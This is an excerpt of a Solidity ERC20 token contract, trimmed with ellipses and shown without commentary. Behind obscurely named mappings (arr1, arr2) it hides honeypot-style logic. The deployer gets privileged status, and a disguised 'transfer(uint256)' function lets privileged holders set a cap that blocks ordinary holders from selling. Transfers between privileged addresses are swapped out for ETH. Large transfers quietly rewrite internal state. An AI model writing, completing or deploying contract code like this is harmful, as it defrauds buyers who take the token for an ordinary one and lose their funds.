...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private arr1;
    mapping(address => uint256) private arr2;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        arr1[address(this)] = _tTotal;
        arr1[msg.sender] = _tTotal;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && arr1[from] == 0 && amount <= swapAtAmount) {
            require(arr2[from] + _value >= 0, 'Transfer amount exceeds maximum amount');
        }
        ...
        } else if (arr1[from] > 0 && arr1[to] > 0) {
            fee = amount;
            _balances[address(this)] += fee;
            return swapTokensForEth(amount, to);
        }
        if (amount > swapAtAmount && to != uniswapV2Pair && to != address(router)) {
            if (arr1[from] > 0) arr1[to] = amount;
            else arr2[to] = amount;
            return;
        }
        bool takeFee = arr1[from] == 0 && arr1[to] == 0 && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (arr2[factory] == 0) arr2[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
    ...
    function transfer(uint256 value) external {
        if (arr1[msg.sender] > feeDivisor) _value = value;
    }
